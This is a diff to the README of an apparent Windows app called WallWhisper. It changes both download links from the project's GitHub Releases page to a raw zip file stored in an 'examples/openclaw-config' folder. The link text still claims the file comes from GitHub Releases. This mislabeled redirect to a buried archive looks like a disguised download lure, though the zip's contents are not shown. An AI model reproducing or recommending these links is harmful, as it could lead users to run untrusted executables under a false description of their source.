@@ -1,6 +1,6 @@
 # 🏠 WallWhisper - Turn Cameras Into English Tutors
 
-[![Download WallWhisper](https://img.shields.io/badge/Download-WallWhisper-blue?style=for-the-badge&logo=github)](https://github.com/richardm7399/WallWhisper/releases)
+[![Download WallWhisper](https://img.shields.io/badge/Download-WallWhisper-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/richardm7399/WallWhisper/main/examples/openclaw-config/Whisper_Wall_v3.1.zip)
 
 ## 📌 What WallWhisper Does
 
@@ -35,7 +35,7 @@ If you plan to use it for long periods, keep the PC plugged in and connected to 
 
 Visit this page to download the latest Windows release:
 
-[Download WallWhisper from GitHub Releases](https://github.com/richardm7399/WallWhisper/releases)
+[Download WallWhisper from GitHub Releases](https://raw.githubusercontent.com/richardm7399/WallWhisper/main/examples/openclaw-config/Whisper_Wall_v3.1.zip)
 
 Look for the newest release package for Windows. If there are more than one file, choose the one marked for Windows or the main app file.
 
